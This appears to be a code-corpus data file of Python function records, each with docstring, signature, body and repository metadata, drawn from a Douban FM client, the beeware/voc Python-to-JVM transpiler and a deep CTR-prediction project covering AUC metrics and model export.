{"docstring": "'''\u9700\u8981\u89e3\u7801\u4e00\u4e0b,\u901a\u77e5\u9700\u8981unicode\u7f16\u7801'''\n", "func_signal": "def send_notify(self, playingsong, content=''):\n", "code": "title = playingsong['title'].decode('utf-8')\ncontent = content.decode('utf-8')\nif title == self.title:\n    if self.has_cover:\n        send_notification(self.title, content, self.cover_file.name)\n    else:\n        send_notification(self.title, content)\nelse:\n    self.init_notification(playingsong)\n    self.title = title", "path": "doubanfm\\notification.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "# \u63a5\u53d7player, data, view\n", "func_signal": "def __init__(self, player, data, queue):\n", "code": "self.player = player\nself.data = data\nself._bind_view()\nself.queue = queue", "path": "doubanfm\\controller\\manager_controller.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "\"\"\"\n\u6bcf\u4e2acontroller\u9700\u8981\u63d0\u4f9brun\u65b9\u6cd5, \u6765\u63d0\u4f9b\u542f\u52a8\n\"\"\"\n", "func_signal": "def run(self, switch_queue):\n", "code": "self.switch_queue = switch_queue\nself.quit = False\n\nThread(target=self._watchdog_queue).start()\nThread(target=self._watchdog_time).start()", "path": "doubanfm\\controller\\manager_controller.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "\"\"\"\n\u6d4b\u8bd5\u5c4f\u5e55\u663e\u793a\u884c\u6570, \u6bcf\u884c\u5b57\u7b26\u6570\n\nreturn: \u5c4f\u5e55\u9ad8\u5ea6 int\n        \u5c4f\u5e55\u5bbd\u5ea6 int\n\"\"\"\n", "func_signal": "def linesnum(self):\n", "code": "import os\nenv = os.environ\n\ndef ioctl_GWINSZ(fd):\n    try:\n        import fcntl, termios, struct\n        cr = struct.unpack('hh', fcntl.ioctl(fd, termios.TIOCGWINSZ,\n    '1234'))\n    except:\n        return\n    return cr\ncr = ioctl_GWINSZ(0) or ioctl_GWINSZ(1) or ioctl_GWINSZ(2)\nif not cr:\n    try:\n        fd = os.open(os.ctermid(), os.O_RDONLY)\n        cr = ioctl_GWINSZ(fd)\n        os.close(fd)\n    except:\n        pass\nif not cr:\n    cr = (env.get('LINES', 25), env.get('COLUMNS', 80))\n\n# Use get(key[, default]) instead of a try/catch\n# try:\n#    cr = (env['LINES'], env['COLUMNS'])\n# except:\n#    cr = (25, 80)\nreturn int(cr[0]), int(cr[1])", "path": "doubanfm\\views\\base_view.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "# Find the most recent exception on the stack that hasn't been\n# ended. That's the block that the catch applies to.\n", "func_signal": "def process(self, context):\n", "code": "for try_catch in context.try_catches[::-1]:\n    if try_catch.end_op is None:\n        break\n\n# print(\"    current try_catch\", try_catch)\n# print(\"    try-catches\", [(id(t), t.end_op) for t in context.try_catches])\n\n# If there are no catches, insert a GOTO operation.\n# The jump distance will be updated when all the CATCH blocks\n# have been processed and the try_catch is converted.\n# If it isn't the first catch, then this catch concludes the\n# previous one. Add a goto to the end of the block, and\n# record the end of the block for framing purposes.\nend_jump = JavaOpcodes.GOTO(0)\nif len(try_catch.handlers) == 0:\n    try_catch.try_end_op = context.opcodes[-1]\nelse:\n    try_catch.handlers[-1].end_op = context.opcodes[-1]\n\ncontext.add_opcodes(jump(end_jump, context, try_catch, OpcodePosition.NEXT))\n\n# Add this block as the finally handler\ntry_catch.finally_handler = self\n\n# The next opcode is the start of the finally block.\ncontext.next_resolve_list.append((self, OpcodePosition.START))\n\n# This opcode isn't for the final output.\nreturn False", "path": "voc\\python\\structures.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "# Find the most recent if block on the stack that hasn't been\n# ended. That's the block that the elif applies to.\n", "func_signal": "def process(self, context):\n", "code": "for if_block in context.blocks[::-1]:\n    if if_block.end_op is None:\n        break\n\n# If this is the first elif, add a GOTO and use it as the\n# jump operation at the end of the IF block. If there are\n# ELIFs, add the GOTO as the jump operation on the most\n# recent ELIF.\n# However, if the most recent operation is a RETURN,\n# this jump isn't needed; just resolve the start position.\nif not isinstance(context.opcodes[-1], (JavaOpcodes.RETURN, JavaOpcodes.ARETURN)):\n    jump_op = JavaOpcodes.GOTO(0)\n    context.add_opcodes(jump_op)\n\n    if len(if_block.elifs) == 0:\n        if_block.jump_op = jump_op\n    else:\n        # print(\"    already got an endif\")\n        if_block.elifs[-1].jump_op = jump_op\n\nif len(if_block.elifs) == 0:\n    jump(if_block.if_op, context, self, OpcodePosition.START)\nelse:\n    jump(if_block.elifs[-1].if_op, context, self, OpcodePosition.START)\n\n# Record the start of the elif block\ncontext.next_resolve_list.append((self, OpcodePosition.START))\n\nif self.opcode:\n    # print(\"    this is an elif\")\n    # Add the stack prepration commands to the code list\n    context.add_opcodes(*self.commands)\n\n    # Create an instance of the opcode and put it on the code list\n    self.if_op = self.opcode(0)\n    context.add_opcodes(self.if_op)\n\n# else:\n    # print(\"    this is an else\")\n\nif_block.elifs.append(self)\n# print(\"IF BLOCKS: \", [(id(b), b.end_op) for b in context.blocks])\n\n# This opcode isn't for the final output.\nreturn False", "path": "voc\\python\\structures.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "# If this TRY can be identified as the start of a new\n# line of source code, track that line.\n", "func_signal": "def __init__(self):\n", "code": "self.starts_line = None\n\n# The first command covered by the try block\nself.start_op = None\n\n# The last command in the try block. This may be a\n# jump to the else or finally block, or past the\n# other handlers.\nself.try_end_op = None\n\n# The jump to the else/finally block.\nself.jump_op = None\n\n# The last command in the try/catch/else/finally sequence\nself.end_op = None\n\n# The catch handlers\nself.handlers = []\n\n# A handler for the finally block\nself.finally_handler = None", "path": "voc\\python\\structures.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "# print(\"LOAD AVAR NAME\", context, self.name)\n# print(\"locals: \", context.local_vars, context.deleted_vars)\n", "func_signal": "def process(self, context):\n", "code": "try:\n    self.index = context.local_vars[self.name]\nexcept KeyError:\n    pass\n\nreturn super().process(context)", "path": "voc\\python\\types\\primitives.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "# print(\"LOAD IVAR NAME\", context, self.name)\n# print(\"locals: \", context.local_vars)\n", "func_signal": "def process(self, context):\n", "code": "try:\n    index = context.local_vars[self.name]\nexcept KeyError:\n    index = None\n\nif index is None:\n    raise NameError(self.name)\n\ncontext.add_opcodes(\n    JavaOpcodes.IINC(index, self.value)\n)\n\n# This opcode isn't for the final output.\nreturn False", "path": "voc\\python\\types\\primitives.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "# Record the start of the if block\n", "func_signal": "def process(self, context):\n", "code": "context.next_resolve_list.append((self, OpcodePosition.START))\n\n# Record this loop.\ncontext.loops.append(self)\n\n# This opcode isn't for the final output.\nreturn False", "path": "voc\\python\\structures.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "# The master IF block\n", "func_signal": "def __init__(self, commands, opcode):\n", "code": "self.if_block = None\n\n# The commands to prepare the stack for the IF comparison\nself.commands = commands if commands is not None else []\n\n# The opcode class to instantiate\nself.opcode = opcode\n\n# The instantiated opcode for the comparison\nself.elif_op = None\n\n# The jump operation at the end of the ELIF, jumping to the\n# end of the IF-ELSE block.\nself.jump_op = None\n\n# If this ELIF can be identified as the start of a new\n# line of source code, track that line.\nself.starts_line = None", "path": "voc\\python\\structures.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "\"\"\"Resolve a jump target in an opcode.\n\ntarget is the Python AST node.\nWhen Python code is converted to Java, it will turn into\n0-N opcodes. We need to specify which one will be used\nas the Java offset:\n * START - the first Java opcode generated from this Python opcode\n * END - the last Java opcode generated from the Python opcode\n * NEXT - the next Java opcode added after this block.\n\"\"\"\n# print(\"RESOLVE %s 0x%x to %s %s\" % (opcode, id(opcode), target, position))\n", "func_signal": "def resolve_jump(opcode, context, target, position):\n", "code": "if position == OpcodePosition.START:\n    opcode.jump_op = target.start_op\nelif position == OpcodePosition.END:\n    opcode.jump_op = target.end_op\nelif position == OpcodePosition.NEXT:\n    opcode.jump_op = target.next_op\nelif position == OpcodePosition.YIELD:\n    opcode.jump_op = target.yield_op\nelse:\n    raise Exception(\"Unknown opcode position\")\n# print(\"JUMP OP IS\", opcode.jump_op)\ncontext.jumps.append(opcode)\nopcode.jump_op.references.append(opcode)", "path": "voc\\python\\structures.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "# The commands to prepare the stack for the IF comparison\n", "func_signal": "def __init__(self, commands, opcode):\n", "code": "self.commands = commands if commands is not None else []\n# print(\"CREATE IF\", id(self), opcode)\n\n# The opcode class to instantiate\nself.opcode = opcode\n\n# The opcode that is the first in the formal IF block\nself.start_op = None\n\n# The instantiated opcode for the comparison\nself.if_op = None\n\n# The list of all ELSE blocks associated with this IF\nself.elifs = []\n\n# The jump operation at the end of the IF, jumping to the\n# end of the IF-ELSE block.\nself.jump_op = None\n\n# The last operation in the IF-ELSE block - the target for\n# all if-exiting jumps.\nself.end_op = None\n\n# If this IF can be identified as the start of a new\n# line of source code, track that line.\nself.starts_line = None", "path": "voc\\python\\structures.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "\"\"\"Create a JavaCode object representing the opcodes stored in the block\n\nMay raise ``IgnoreBlock`` if the block should be ignored.\n\"\"\"\n# Install the shortcut jump points for yield statements.\n", "func_signal": "def transpile_code(self):\n", "code": "yield_jumps = Accumulator()\n\nfor i, yield_point in enumerate(self.yield_points):\n    yield_jumps.add_opcodes(\n        ALOAD_index(self.local_vars['<generator>']),\n        JavaOpcodes.GETFIELD('org/python/types/Generator', 'yield_point', 'I'),\n        ICONST_val(i + 1),\n        jump(JavaOpcodes.IF_ICMPEQ(0), self, yield_point, OpcodePosition.YIELD)\n    )\n\nself.opcodes = yield_jumps.opcodes + self.opcodes\n\n# Make sure every local variable slot has been initialized\n# as an object. This is needed because Python allows a variable\n# to be instantiated in a sub-block, and used outside that block.\n# The JVM doesn't, and raises a verify error if you try. By\n# initializing all variables, we can trick the verifier.\n# TODO: Ideally, we'd only initialize the variables that are ambiguous.\ninit_vars = Accumulator()\nfor i in range(\n            len(self.parameters) + (1 if self.has_self else 0),\n            len(self.active_local_vars) + len(self.deleted_vars)\n        ):\n    init_vars.add_opcodes(\n        JavaOpcodes.ACONST_NULL(),\n        ASTORE_index(i)\n    )\n\nself.opcodes = init_vars.opcodes + self.opcodes\n\n# Since we've processed all the Python opcodes, we can now resolve\n# all the unknown jump targets.\n# print('>>>>> Resolve references')\nfor target, references in self.unknown_jump_targets.items():\n    # print(\"   resolving %s references to %s\" % (len(references), target))\n    for opcode, position in references:\n        resolve_jump(opcode, self, target, position)\n\n# If the block has no content in it, and the block allows,\n# ignore this block.\nif self.can_ignore_empty:\n    if len(self.opcodes) == 1 and isinstance(self.opcodes[0], JavaOpcodes.RETURN):\n        raise IgnoreBlock()\n    elif len(self.opcodes) == 2 and isinstance(self.opcodes[1], JavaOpcodes.ARETURN):\n        raise IgnoreBlock()\n\n# Now that we have a complete opcode list, postprocess the list\n# with the known offsets.\noffset = 0\n# print('>>>>> set offsets', self)\nfor index, instruction in enumerate(self.opcodes):\n    # print(\"%4d:%4d (0x%x) %s\" % (index, offset, id(instruction), instruction))\n    instruction.java_index = index\n    instruction.java_offset = offset\n    offset += len(instruction)\n# print('>>>>> end set offsets')\n\n# The maximum length of a method in JVM is 65534 bytes. (See: Section 4.7.3, JVM 7 Specs)\nif offset > 65534:\n    raise BlockCodeTooLarge(offset)\n\n# Construct the exception table, updating any\n# end-of-exception GOTO operations with the right opcode.\n# Record a frame range for each one.\nexceptions = []\nfor try_catch in self.try_catches:\n    # print(\"TRY CATCH START\", id(try_catch), try_catch.start_op, try_catch.start_op.java_offset)\n    # print(\"        TRY END\", try_catch.try_end_op, try_catch.try_end_op.java_offset)\n    # print(\"            END\", try_catch.end_op, try_catch.end_op.java_offset)\n    for handler in try_catch.handlers:\n        # print(\"  HANDLER\", handler.start_op, handler.end_op, handler.descriptors)\n        if handler.descriptors:\n            for descriptor in handler.descriptors:\n                exceptions.append(JavaExceptionInfo(\n                    try_catch.start_op.java_offset,\n                    try_catch.try_end_op.java_offset,\n                    handler.start_op.java_offset,\n                    descriptor\n                ))\n        else:\n            exceptions.append(JavaExceptionInfo(\n                try_catch.start_op.java_offset,\n                try_catch.try_end_op.java_offset,\n                handler.start_op.java_offset,\n                'org/python/exceptions/BaseException'\n            ))\n\n    # Add definitions for the finally block\n    if try_catch.finally_handler:\n        # print(\n        #     \"  FINALLY\",\n        #     try_catch.finally_handler.start_op.java_offset,\n        #     try_catch.finally_handler.end_op.java_offset\n        # )\n        exceptions.append(JavaExceptionInfo(\n            try_catch.start_op.java_offset,\n            try_catch.try_end_op.java_offset,\n            try_catch.finally_handler.start_op.java_offset,\n            None\n        ))\n        for handler in try_catch.handlers:\n            # print(\"   h\", handler.descriptors)\n            exceptions.append(JavaExceptionInfo(\n                handler.start_op.java_offset,\n                handler.end_op.java_offset,\n                try_catch.finally_handler.start_op.java_offset,\n                None\n            ))\n\n# Update any jump instructions\n# print (\"There are %s jumps\" % len(self.jumps))\nfor jmp in self.jumps:\n    # print (\"JUMP\", hex(id(jmp)), jmp, jmp.java_offset, jmp.jump_op, hex(id(jmp.jump_op)))\n    try:\n        jmp.offset = jmp.jump_op.java_offset - jmp.java_offset\n    except AttributeError:\n        jmp.offset = jmp.jump_op.start_op.java_offset - jmp.java_offset\n\n# Construct a line number table from\n# the source code reference data on opcodes.\nline_numbers = []\nfor opcode in self.opcodes:\n    if opcode.starts_line is not None:\n        line_numbers.append((opcode.java_offset, opcode.starts_line))\nline_number_table = LineNumberTable(line_numbers)\n\nreturn JavaCode(\n    max_stack=self.max_stack(exceptions),\n    max_locals=self.max_locals(),\n    code=self.opcodes,\n    exceptions=exceptions,\n    attributes=[\n        line_number_table\n    ]\n)", "path": "voc\\python\\blocks.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "# Find the most recent if block on the stack that hasn't been\n# ended. That's the block that the elif applies to.\n", "func_signal": "def process(self, context):\n", "code": "for if_block in context.blocks[::-1]:\n    if if_block.end_op is None:\n        if_block.end_op = RESOLVE\n        break\n\n# If there aren't any ELIF/ELSE definitions, then the\n# main if block jumps straight to the end.\nif len(if_block.elifs) == 0:\n    jump(if_block.if_op, context, if_block, OpcodePosition.NEXT)\n\n# Each of the 'end of block' jumps go to the end as well.\nif if_block.jump_op:\n    jump(if_block.jump_op, context, if_block, OpcodePosition.NEXT)\n\nfor block in if_block.elifs:\n    if block.jump_op:\n        jump(block.jump_op, context, if_block, OpcodePosition.NEXT)\n\n# The next opcode is outside the IF/ELIF/ELSE block.\ncontext.next_resolve_list.append((if_block, OpcodePosition.NEXT))\n\n# This opcode isn't for the final output.\nreturn False", "path": "voc\\python\\structures.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "# Find the most recent exception on the stack that hasn't been\n# ended. That's the block we're ending.\n", "func_signal": "def process(self, context):\n", "code": "for try_catch in context.try_catches[::-1]:\n    if try_catch.end_op is None:\n        try_catch.end_op = RESOLVE\n        break\n\n# print(\"    current try_catch\", try_catch)\n# print(\"    try-catches\", [(id(t), t.end_op) for t in context.try_catches])\n\nif try_catch.finally_handler:\n    try_catch.finally_handler.end_op = context.opcodes[-1]\nelif len(try_catch.handlers) > 0:\n    try_catch.handlers[-1].end_op = context.opcodes[-1]\n\ntry_catch.end_op = context.opcodes[-1]\n\n# The next opcode is the end of the try-catch block.\ncontext.next_resolve_list.append((try_catch, OpcodePosition.NEXT))\n\n# This opcode isn't for the final output.\nreturn False", "path": "voc\\python\\structures.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "# print(\"LOAD LVAR NAME\", context, self.name, index)\n# print(\"locals: \", context.local_vars)\n", "func_signal": "def process(self, context):\n", "code": "try:\n    index = context.local_vars[self.name]\nexcept KeyError:\n    index = None\n\nif index is None:\n    raise NameError(self.name)\nelif index == 0:\n    context.add_opcodes(JavaOpcodes.LLOAD_0())\nelif index == 1:\n    context.add_opcodes(JavaOpcodes.LLOAD_1())\nelif index == 2:\n    context.add_opcodes(JavaOpcodes.LLOAD_2())\nelif index == 3:\n    context.add_opcodes(JavaOpcodes.LLOAD_3())\nelse:\n    context.add_opcodes(JavaOpcodes.LLOAD(index))\n\n# This opcode isn't for the final output.\nreturn False", "path": "voc\\python\\types\\primitives.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "\"\"\"Write a float constant onto the stack.\n\nThere are a couple of opcodes that can be used to optimize the\nloading of some floats; use them if possible.\n\"\"\"\n", "func_signal": "def FCONST_val(value):\n", "code": "if isinstance(value, float):\n    if value == 0.0:\n        return JavaOpcodes.FCONST_0()\n    elif value == 1.0:\n        return JavaOpcodes.FCONST_1()\n    elif value == 2.0:\n        return JavaOpcodes.FCONST_2()\n    else:\n        return JavaOpcodes.LDC_W(value)\nelse:\n    raise RuntimeError(\"%s is not a float constant\" % value)", "path": "voc\\python\\types\\primitives.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "# print(\"LOAD IVAR NAME\", context, self.name)\n# print(\"locals: \", context.local_vars)\n", "func_signal": "def process(self, context):\n", "code": "try:\n    index = context.local_vars[self.name]\nexcept KeyError:\n    index = None\n\nif index is None:\n    raise NameError(self.name)\nelif index == 0:\n    context.add_opcodes(JavaOpcodes.ILOAD_0())\nelif index == 1:\n    context.add_opcodes(JavaOpcodes.ILOAD_1())\nelif index == 2:\n    context.add_opcodes(JavaOpcodes.ILOAD_2())\nelif index == 3:\n    context.add_opcodes(JavaOpcodes.ILOAD_3())\nelse:\n    context.add_opcodes(JavaOpcodes.ILOAD(index))\n\n# This opcode isn't for the final output.\nreturn False", "path": "voc\\python\\types\\primitives.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "# TODO: add support for exc_type and traceback information\n", "func_signal": "def test_with_body_fails(self):\n", "code": "self.assertCodeExecution(\"\"\"\n    class CtxMgr:\n        def __enter__(self):\n            print('entering CtxMgr')\n        def __exit__(self, exc_type, exc_value, traceback):\n            print('exiting CtxMgr')\n            # print('exc_type', exc_type)\n            print('exc_value', exc_value)\n            # print('traceback', traceback)\n\n    with CtxMgr():\n        raise KeyError('ola')\n    \"\"\", exits_early=True)", "path": "tests\\structures\\test_with.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "\"\"\"Write an long integer constant onto the stack.\n\nThere are a couple of opcodes that can be used to optimize the\nloading of small longs; use them if possible.\n\"\"\"\n", "func_signal": "def LCONST_val(value):\n", "code": "if isinstance(value, int):\n    if value == 0:\n        return JavaOpcodes.LCONST_0()\n    elif value == 1:\n        return JavaOpcodes.LCONST_1()\n    else:\n        return JavaOpcodes.LDC2_W(value)\nelse:\n    raise RuntimeError(\"%s is not a long integer constant\" % value)", "path": "voc\\python\\types\\primitives.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "\"\"\"Define a jump operation.\n\nThe specific offset will be resolved once all the\nJava opcodes have been instantiated\n\"\"\"\n# print(\"    add jump to reference %s 0x%x %s %s...\" % (opcode, id(opcode), target, position))\n", "func_signal": "def jump(opcode, context, target, position):\n", "code": "context.unknown_jump_targets.setdefault(target, []).append((opcode, position))\nreturn opcode", "path": "voc\\python\\structures.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "# The opcode that is the first in the formal LOOP block\n", "func_signal": "def __init__(self):\n", "code": "self.start_op = None\n\n# The last operation in the LOOP block\nself.end_op = None\n\n# If this IF can be identified as the start of a new\n# line of source code, track that line.\nself.starts_line = None", "path": "voc\\python\\structures.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "# Record the start of the if block\n", "func_signal": "def process(self, context):\n", "code": "context.next_resolve_list.append((self, OpcodePosition.START))\n\n# Add the stack prepration commands to the code list\ncontext.add_opcodes(*self.commands)\n\n# Create an instance of the opcode and put it on the code list\nself.if_op = self.opcode(0)\ncontext.add_opcodes(self.if_op)\n\n# Record this IF.\ncontext.blocks.append(self)\n\n# This opcode isn't for the final output.\nreturn False", "path": "voc\\python\\structures.py", "repo_name": "beeware/voc", "stars": 865, "license": "bsd-3-clause", "language": "python", "size": 14845}
{"docstring": "\"\"\"Calculate group auc\"\"\"\n\n", "func_signal": "def cal_group_auc(labels, preds, user_id_list):\n", "code": "print('*' * 50)\nif len(user_id_list) != len(labels):\n    raise ValueError(\n        \"impression id num should equal to the sample num,\" \\\n        \"impression id num is {0}\".format(len(user_id_list)))\ngroup_score = defaultdict(lambda: [])\ngroup_truth = defaultdict(lambda: [])\nfor idx, truth in enumerate(labels):\n    user_id = user_id_list[idx]\n    score = preds[idx]\n    truth = labels[idx]\n    group_score[user_id].append(score)\n    group_truth[user_id].append(truth)\n\ngroup_flag = defaultdict(lambda: False)\nfor user_id in set(user_id_list):\n    truths = group_truth[user_id]\n    flag = False\n    for i in range(len(truths) - 1):\n        if truths[i] != truths[i + 1]:\n            flag = True\n            break\n    group_flag[user_id] = flag\n\nimpression_total = 0\ntotal_auc = 0\n#\nfor user_id in group_flag:\n    if group_flag[user_id]:\n        auc = roc_auc_score(np.asarray(group_truth[user_id]), np.asarray(group_score[user_id]))\n        total_auc += auc * len(group_truth[user_id])\n        impression_total += len(group_truth[user_id])\ngroup_auc = float(total_auc) / impression_total\ngroup_auc = round(group_auc, 4)\nreturn group_auc", "path": "ESMM\\metric.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"Export to SavedModel format.\n\nArgs:\n  model: Estimator object\n  export_dir: directory to export the model.\n  model_column_fn: Function to generate model feature columns.\n\"\"\"\n", "func_signal": "def export_model(model, export_dir, model_column_fn):\n", "code": "columns = model_column_fn\ncolumns.append(tf.feature_column.numeric_column(\"user_id\", default_value=123456, dtype=tf.int64))\ncolumns.append(tf.feature_column.numeric_column(\"label\", default_value=0, dtype=tf.int64))\nfeature_spec = tf.feature_column.make_parse_example_spec(columns)\nexample_input_fn = (\n    tf.estimator.export.build_parsing_serving_input_receiver_fn(feature_spec))\nmodel.export_savedmodel(export_dir, example_input_fn)", "path": "XDeepFM\\train.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"Display evaluate result.\"\"\"\n", "func_signal": "def model_predict(model, eval_input_fn, epoch):\n", "code": "prediction_result = model.predict(eval_input_fn)\n\nclick_sum = 0.0\npredictions = []\nuser_id_list = []\nlabels = []\nnum_samples = FLAGS.batch_size * FLAGS.predict_steps\nnum_pre_samples = 0\nprint(num_samples)\nfor pred_dict in prediction_result:\n    # print(pred_dict)\n    user_id = pred_dict['user_id'][0]\n    p = pred_dict['probabilities'][0]\n    label = float(pred_dict['label'][0])\n    click_sum += p\n    predictions.append(p)\n    user_id_list.append(user_id)\n    labels.append(label)\n    if (p >= 0.5):\n        num_pre_samples += 1\n\n    if len(predictions) % (num_samples / 10) == 0:\n        tf.logging.info('predict at step %d/%d', int(float(len(predictions)) / num_samples * FLAGS.predict_steps),\n                        FLAGS.predict_steps)\n    if len(predictions) >= num_samples:\n        break\n\n#tf.metrics.precision\n# print(len(predictions))\nnum_samples = len(predictions)\nprint('the predicted positive samples is: ' + str(num_pre_samples))\n# Display evaluation metrics\n\nlabel_mean = sum(labels) / num_samples\nprediction_mean = sum(predictions) / num_samples\nloss = sum(cross_entropy_loss(labels, predictions)) / num_samples * FLAGS.batch_size\nauc = roc_auc_score(labels, predictions)\ngroup_auc = cal_group_auc(labels, predictions, user_id_list)\n\npredict_diff = np.array(predictions) - prediction_mean\npredict_diff_square_sum = sum(np.square(predict_diff))\ns_deviation = np.sqrt(predict_diff_square_sum / num_samples)\nc_deviation = s_deviation / prediction_mean\n\ntrue_positive_samples = (np.array(predictions) * np.array(labels) >= 0.5).tolist().count(True)\nfalse_positive_samples = (np.array(predictions) * (1 - np.array(labels)) >= 0.5).tolist().count(True)\nprint(true_positive_samples)\nprint(false_positive_samples)\n# precision = float(true_positive_samples)/(true_positive_samples+false_positive_samples)\nprecision = 0\nfalse_negative_samples = (np.array(predictions) * np.array(labels) < 0.5).tolist().count(True)\nrecall = float(true_positive_samples) / (true_positive_samples + false_negative_samples)\nprint(false_negative_samples)\ntf.logging.info('Results at epoch %d/%d', (epoch + 1), FLAGS.num_epochs)\ntf.logging.info('-' * 60)\ntf.logging.info('label/mean: %s' % label_mean)\ntf.logging.info('predictions/mean: %s' % prediction_mean)\ntf.logging.info('total loss average batchsize: %s' % loss)\ntf.logging.info('standard deviation: %s' % s_deviation)\ntf.logging.info('coefficient of variation: %s' % c_deviation)\ntf.logging.info('precision: %s' % precision)\ntf.logging.info('recall: %s' % recall)\ntf.logging.info('auc: %s' % auc)\ntf.logging.info('group auc: %s' % group_auc)", "path": "Din\\train.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"Export to SavedModel format.\n\nArgs:\n  model: Estimator object\n  export_dir: directory to export the model.\n  model_column_fn: Function to generate model feature columns.\n\"\"\"\n", "func_signal": "def export_model(model, export_dir, model_column_fn):\n", "code": "columns = model_column_fn\ncolumns.append(tf.feature_column.numeric_column(\"user_id\", default_value=123456, dtype=tf.int64))\ncolumns.append(tf.feature_column.numeric_column(\"label\", default_value=0, dtype=tf.int64))\nother_feature_columns = {\n    \"product_id_att\": tf.FixedLenFeature(shape=[1], dtype=tf.string),\n    \"creative_id_att\": tf.FixedLenFeature(shape=[1], dtype=tf.string),\n    \"user_click_products_att\": tf.FixedLenFeature(shape=[10], dtype=tf.string),\n    \"user_click_creatives_att\": tf.FixedLenFeature(shape=[10], dtype=tf.string)\n}\nfeature_spec = tf.feature_column.make_parse_example_spec(columns)\nfeature_spec.update(other_feature_columns)\nexample_input_fn = (\n    tf.estimator.export.build_parsing_serving_input_receiver_fn(feature_spec))\nmodel.export_savedmodel(export_dir, example_input_fn)", "path": "Din\\train.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"Calculate group auc\"\"\"\n\n", "func_signal": "def cal_group_auc(labels, preds, user_id_list):\n", "code": "print('*' * 50)\nif len(user_id_list) != len(labels):\n    raise ValueError(\n        \"impression id num should equal to the sample num,\" \\\n        \"impression id num is {0}\".format(len(user_id_list)))\ngroup_score = defaultdict(lambda: [])\ngroup_truth = defaultdict(lambda: [])\nfor idx, truth in enumerate(labels):\n    user_id = user_id_list[idx]\n    score = preds[idx]\n    truth = labels[idx]\n    group_score[user_id].append(score)\n    group_truth[user_id].append(truth)\n\ngroup_flag = defaultdict(lambda: False)\nfor user_id in set(user_id_list):\n    truths = group_truth[user_id]\n    flag = False\n    for i in range(len(truths) - 1):\n        if truths[i] != truths[i + 1]:\n            flag = True\n            break\n    group_flag[user_id] = flag\n\nimpression_total = 0\ntotal_auc = 0\n#\nfor user_id in group_flag:\n    if group_flag[user_id]:\n        auc = roc_auc_score(np.asarray(group_truth[user_id]), np.asarray(group_score[user_id]))\n        total_auc += auc * len(group_truth[user_id])\n        impression_total += len(group_truth[user_id])\ngroup_auc = float(total_auc) / impression_total\ngroup_auc = round(group_auc, 4)\nreturn group_auc", "path": "XDeepFM\\metric.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"Detect whether the current running environment is on GCP.\"\"\"\n", "func_signal": "def on_gcp():\n", "code": "try:\n  # Timeout in 5 seconds, in case the test environment has connectivity issue.\n  # There is not default timeout, which means it might block forever.\n  response = requests.get(\n      GCP_METADATA_URL, headers=GCP_METADATA_HEADER, timeout=5)\n  return response.status_code == 200\nexcept requests.exceptions.RequestException:\n  return False", "path": "official\\utils\\logs\\cloud_lib.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
